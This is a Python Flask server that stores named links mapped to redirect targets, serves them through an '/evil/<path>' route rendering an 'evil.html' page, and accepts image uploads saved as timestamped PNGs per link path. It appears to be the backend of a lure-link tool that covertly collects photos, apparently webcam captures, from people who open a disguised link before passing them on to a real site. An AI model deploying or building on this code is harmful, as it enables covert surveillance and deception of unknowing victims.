from flask import Flask, request, send_file, render_template
from sys import gettrace
from gevent import pywsgi
import logging
import time
import sqlite3
import re
import pathlib
import os

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

count = 0

conn = sqlite3.connect('data.sqlite', check_same_thread=False)
cur = conn.cursor()

cur.execute('CREATE TABLE IF NOT EXISTS links (path TEXT, target TEXT)')

valid = re.compile(r'^[a-zA-Z0-9_\-]{1,}$')


@app.route('/upload', methods=['POST'])
def upload():
    global count
    app.logger.info('upload')
    file = request.files.get('file')
    path = request.args.get('path')
    if path is None or valid.match(path) is None:
        return 'invalid path', 400

    if not pathlib.Path(f'photos/{path}').is_dir():
        os.makedirs(f'photos/{path}')
        
    file.save(
        f'photos/{path}/{time.strftime("%Y-%m-%d %H %M %S")} [{count}].png')
    count = count + 1 if count < 100 else 0
    return ''


@app.route('/')
def index():
    return send_file('index.html')


@app.route('/api/create')
def createLink():
    cur.execute('SELECT * FROM links WHERE path = ?',
                (request.args.get('path'),))
    if cur.fetchone():
        return 'link already exists', 400

    cur.execute('INSERT INTO links (path, target) VALUES (?, ?)',
                (request.args.get('path'), request.args.get('target')))
    conn.commit()
    return 'Link created'


@app.route('/api/get')
def getLink():
    cur.execute('SELECT * FROM links WHERE path = ?',
                (request.args. get('path'),))
    link = cur.fetchone()
    if not link:
        return 'link not found', 404

    return link[1]


@app.route('/evil', defaults={'path': ''})
@app.route('/evil/<path:path>')
def evil(path):
    cur.execute('SELECT * FROM links WHERE path = ?',
                (path,))
    fetch = cur.fetchone()
    if fetch is None:
        return render_template('evil.html', target='', path=path)

    return render_template('evil.html', target=fetch[1], path=path)


if __name__ == '__main__':
    app.logger.info('started')
    if gettrace():  # check whether program is running under debug mode
        app.run(host='0.0.0.0')
    else:
        server = pywsgi.WSGIServer(('0.0.0.0', 5000), app)
        server.serve_forever()
